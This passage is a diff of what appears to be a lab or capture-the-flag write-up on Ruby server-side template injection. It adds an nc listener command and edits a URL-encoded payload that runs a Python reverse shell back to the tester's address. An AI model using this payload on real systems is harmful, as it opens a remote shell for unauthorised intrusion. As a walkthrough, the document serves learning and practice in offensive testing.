@@ -174,11 +174,17 @@ I was able to test and locate this vulnerability using simple arithmetic logic d
 
 After I was able to confirm code execution was taking place, the next logical step is to replace the benign payload with a more malicious one and attempt to execute a reverse shell.
 
+Start nc listener:
+
+```
+nc -lnvp 1337
+```
+
 <mark style="color:yellow;">Ruby SSTI Python-based Reverse Shell Payload</mark>:
 
 {% code overflow="wrap" %}
 ```
-http://10.10.14.38/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.38",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+http://10.10.14.38/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.38",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
 ```
 {% endcode %}
 
